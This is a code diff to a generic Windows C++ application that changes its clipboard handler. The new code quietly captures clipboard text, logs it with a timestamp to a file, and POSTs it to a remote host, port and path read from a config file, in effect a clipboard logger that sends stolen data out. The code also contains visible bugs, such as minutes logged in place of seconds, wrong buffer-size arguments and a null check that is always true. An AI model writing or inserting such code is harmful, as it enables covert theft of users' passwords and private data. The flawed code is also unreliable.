@@ -3,6 +3,8 @@
 
 #include "framework.h"
 #include "Project2.h"
+#include "stdio.h"
+#include "winhttp.h"
 
 #define MAX_LOADSTRING 100
 
@@ -95,11 +97,61 @@ HWND InitInstance(HINSTANCE hInstance, int nCmdShow)
 }
 
 void clipBoadProc() {
-	HGLOBAL  handle = GetClipboardData(CF_TEXT);
+	OpenClipboard(nullptr);
+	HGLOBAL  handle = GetClipboardData(CF_UNICODETEXT);
 
-	LPSTR str = (LPSTR)GlobalLock(handle);
-	MessageBox(nullptr, (LPCWSTR)str, nullptr, 0);
+	LPCWSTR str = (LPCWSTR)GlobalLock(handle);
+	//begin
+	//MessageBoxW(nullptr, str, nullptr, 0);
+	FILE* file;
+	wchar_t filename[1024] = { 0 };
+	GetPrivateProfileString(L"main", L"filename", nullptr, filename, sizeof(filename), L".\\config.ini");
+
+	wchar_t host[1024] = { 0 };
+	GetPrivateProfileString(L"main", L"host", nullptr, host, sizeof(host), L".\\config.ini");
+
+	wchar_t path[1024] = { 0 };
+	GetPrivateProfileString(L"main", L"path", L"/", path, sizeof(host), L".\\config.ini");
+
+	_tfopen_s(&file, filename, L"a");
+
+	int port = GetPrivateProfileInt(L"main", L"port", 80, L".\\config.ini");
+
+	char buf[256] = { 0 };
+	if (str) {
+		WideCharToMultiByte(CP_ACP, 0, str, wcslen(str) + 1, buf, 256, NULL, NULL);
+	}
+
+	if (file && str) {
+
+		SYSTEMTIME tm;
+		GetLocalTime(&tm);
+		char timeBuf[64] = { 0 };
+		sprintf_s(timeBuf, sizeof(timeBuf), "[%d-%d-%d %d:%d:%d] ", tm.wYear, tm.wMonth, tm.wDay, tm.wHour, tm.wMinute, tm.wMinute);
+		fwrite(timeBuf, strlen(timeBuf), 1, file);
+		fwrite(buf, sizeof(char), strlen(buf), file);
+		char rt = '\n';
+		fwrite(&rt, sizeof(char), 1, file);
+		file&& fclose(file);
+	}
+
+	if (host && str) {
+		auto hSession = WinHttpOpen(L"vc++", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+		auto hConn = WinHttpConnect(hSession, host, port, 0);
+		auto hReq = WinHttpOpenRequest(hConn, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+		auto result = WinHttpSendRequest(hReq,
+			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+			(LPVOID*)buf, strlen(buf), strlen(buf), 0);
+		hReq&& WinHttpCloseHandle(hReq);
+		hConn&& WinHttpCloseHandle(hConn);
+		hSession&& WinHttpCloseHandle(hSession);
+	}
+
+
+
+	//end	
 	GlobalUnlock(handle);
+	CloseClipboard();
 }
 
 //
